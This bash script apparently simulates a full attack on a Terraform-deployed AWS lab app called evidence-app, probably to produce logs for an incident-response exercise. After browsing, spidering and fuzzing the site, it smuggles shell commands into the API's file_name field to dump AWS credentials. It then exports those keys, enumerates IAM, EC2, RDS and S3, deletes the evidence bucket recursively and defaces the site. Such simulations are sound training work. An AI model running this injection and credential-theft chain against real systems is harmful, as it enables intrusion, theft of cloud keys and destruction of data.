#!/bin/bash

echo -e "\033[32mAcquiring target URL...\033[0m"
cd /home/cloudshell-user/evidence-app
TARGET=$(terraform output | cut -d '"' -f2)

echo -e "\033[32mVisiting page like a browser...\033[0m"
curl $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/styles.css -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/script.js -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/Cloud_Ace_Final.png -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/favicon.ico -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null

sleep 5

echo -e "\033[32mUploading file like a browser...\033[0m"
curl -XPOST $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d '{"file_name":"sample.txt","file_data":"dGVzdAo="}' >/dev/null
curl $TARGET/api/ -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null

sleep 5

echo -e "\033[32mSpidering web site...\033[0m"
wget --spider --force-html --span-hosts --user-agent="TotallyNotWget" \
  --no-parent --limit-rate=20k --execute robots=off --recursive \
  --level=2 $TARGET --output-file /tmp/wget.log

sleep 5

echo -e "\033[32mReviewing script.js...\033[0m"
curl $TARGET/script.js >/dev/null
sleep 2
curl $TARGET/script.js >/dev/null

sleep 5

echo -e "\033[32mCommunicating with /api/...\033[0m"
curl $TARGET/api/ >/dev/null
sleep 2
curl -X POST $TARGET/api/ >/dev/null

sleep 5

echo -e "\033[32mGrabbing headers...\033[0m"
curl --head $TARGET >/dev/null
sleep 2
curl --head $TARGET/api/ >/dev/null

echo -e "\033[32mVisiting page like a browser (again)...\033[0m"
curl $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/styles.css -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/script.js -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/Cloud_Ace_Final.png -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/favicon.ico -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null

sleep 5

echo -e "\033[32mFuzzing App...\033[0m"
/home/cloudshell-user/evidence-app/scripts/fuzz_evidence_app.py --target $TARGET/api/ >/dev/null

sleep 5

echo -e "\033[32mSteal credentials...\033[0m"
curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -d '{"file_name":";env;","file_data":"dGVzdAo="}' >/dev/null
sleep 2
curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -d '{"file_name":";env|egrep \"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\"","file_data":"dGVzdAo="}' >/dev/null
sleep 2
curl $TARGET/api/ >/dev/null
sleep 2
export AWS_ACCESS_KEY_ID=$(curl -s $TARGET/api/ | egrep -o "AWS_ACCESS_KEY_ID=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2)
export AWS_SECRET_ACCESS_KEY=$(curl -s $TARGET/api/ | egrep -o "AWS_SECRET_ACCESS_KEY=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2,100)
export AWS_SESSION_TOKEN=$(curl -s $TARGET/api/ | egrep -o "AWS_SESSION_TOKEN=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2,100)

sleep 5

echo -e "\033[32mPerforming Discovery...\033[0m"
aws sts get-caller-identity >/dev/null
sleep 2
aws iam list-attached-role-policies --role-name EvidenceLambdaRole 2>/dev/null >/dev/null
sleep 2
aws ec2 describe-instances 2>/dev/null >/dev/null
sleep 2
aws rds describe-db-instances 2>/dev/null >/dev/null
sleep 2
aws s3 ls >/dev/null
sleep 2
EVIDENCE_BUCKET=$(aws s3 ls | egrep -o evidence-.*)
WEBCODE_BUCKET=$(aws s3 ls | egrep -o webcode-.*)

sleep 5

echo -e "\033[32mDestroying evidence...\033[0m"
aws s3 ls s3://$EVIDENCE_BUCKET >/dev/null
sleep 2
aws s3 rm s3://$EVIDENCE_BUCKET --recursive >/dev/null
sleep 2
aws s3 ls s3://$EVIDENCE_BUCKET >/dev/null

sleep 5

echo -e "\033[32mDefacing webpage...\033[0m"
cat << EOF > /tmp/index.html
<html>
<body>
<h1>Your evidence is gone!<br/>-Moriarty</h1>
</body>
</html>
EOF
aws s3 cp /tmp/index.html s3://$WEBCODE_BUCKET/index.html >/dev/null

sleep 5

echo -e "\033[32mVisiting page like a browser (last time)...\033[0m"
curl $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/styles.css -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/script.js -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/Cloud_Ace_Final.png -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
curl $TARGET/favicon.ico -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null

exit 0